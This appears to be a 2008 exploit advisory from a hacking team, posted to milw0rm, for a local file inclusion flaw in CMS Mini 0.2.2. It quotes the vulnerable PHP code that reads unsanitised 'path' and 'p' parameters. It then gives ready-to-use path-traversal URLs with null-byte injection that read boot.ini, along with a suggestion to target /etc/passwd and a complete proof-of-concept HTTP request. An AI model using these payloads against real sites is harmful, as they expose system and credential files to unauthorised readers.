@@ -1,0 +1,83 @@
+=====================================================
+  CMS Mini 0.2.2 Local File Inclusion Vulnerability
+=====================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 22 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : CMS Mini
+ VERSION     : 0.2.2
+ VENDOR	     : http://www.cmsmini.it/
+ DOWNLOAD    : http://downloads.sourceforge.net/cmsmini
+#####################################################
+
+--- Local File Inclusion ---
+
+----------------------------
+ Vulnerable File [view/index.php]
+----------------------------
+
+@Line 5
+
+   20:  if( !is_dir('../pages') ) header("location: ../admin/login.php");
+   21:
+   22:  $path = $_GET['path'];
+   23:  $p = $_GET['p'];
+   24:  $msg = $_GET['msg'];
+   25:  $pext = strrchr($p, '.');
+   26:  if( $path )
+   27:  $dirpath = '../pages/'.$path;
+   28:  else
+   29:  $dirpath = '../pages';
+
+
+---------
+ Exploit
+---------
+[+] http://[Target]/[cmsmini_path]/view/?path=../../../../../../../../boot.ini%00&p=index.html
+[+] http://[Target]/[cmsmini_path]/view/?path=cwh&p=../../../../../../../../boot.ini%00.html
+
+    This exploit will open boot.ini in system file:
+
+[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+
+    You can change boot.ini to /etc/passwd%00 in linux OS.
+
+-------------
+ POC Exploit
+-------------
+
+[+] GET http://192.168.24.25/cmsmini/view/?path=../../../../../../../../../../boot.ini%00&p=index.html HTTP/1.1
+[+] Host: 192.168.24.25
+[+] User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14
+[+] Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+[+] Accept-Language: en-us,en;q=0.5
+[+] Accept-Encoding: gzip,deflate
+[+] Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+[+] Keep-Alive: 300
+[+] Proxy-Connection: keep-alive
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-22]
